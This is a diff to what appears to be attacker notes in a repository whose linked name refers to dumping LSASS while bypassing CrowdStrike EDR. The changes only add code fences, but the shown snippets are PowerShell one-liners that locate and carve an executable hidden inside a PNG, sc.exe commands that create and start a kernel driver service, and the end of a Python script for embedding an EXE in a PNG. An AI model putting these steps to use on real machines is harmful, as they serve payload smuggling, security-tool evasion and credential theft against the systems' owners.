@@ -3,11 +3,13 @@ https://github.com/wtechsec/LSASS-Forked-Dump---Bypass-EDR-CrowdStrike/blob/main
 
 
 # powershell code, check offset for bytes 
+```ps
 $b=[IO.File]::ReadAllBytes("C:\Users\user\Desktop\output.png");$t=[byte[]](0x4D,0x5A,0x78,0x00,0x01,0x00,0x00,0x00);$c=0;for($i=0;$i-le$b.Length-$t.Length;$i++){$m=$true;for($j=0;$j-lt$t.Length;$j++){if($b[$i+$j]-ne$t[$j]){$m=$false;break}};if($m){$c++;Write-Host "Found at offset: $i"}}; Write-Host "Total: $c"
-
+```
 # powershell code, remove all bytes before specificied search
+```ps
 $b=[IO.File]::ReadAllBytes("C:\Users\user\Desktop\output.png");$t=[byte[]](0x4D,0x5A,0x78,0x00,0x01,0x00,0x00,0x00);for($i=0;$i-le$b.Length-$t.Length;$i++){$m=$true;for($j=0;$j-lt$t.Length;$j++){if($b[$i+$j]-ne$t[$j]){$m=$false;break}};if($m){[IO.File]::WriteAllBytes("C:\Users\simspace\Desktop\output.png",$b[$i..($b.Length-1)]);break}}
-
+```
 # simple load of kernel driver 
 sc.exe create KernelName type= kernel binPath= "C:\Users\user\Desktop\kernel.sys"
 sc.exe start KernelName
@@ -41,7 +43,7 @@ if __name__ == '__main__':
     args = parser.parse_args()
 
     embed_exe_in_png(args.png, args.exe, args.output)
-```py
+```
 
 # check first 8 bytes of exe 
 ```py
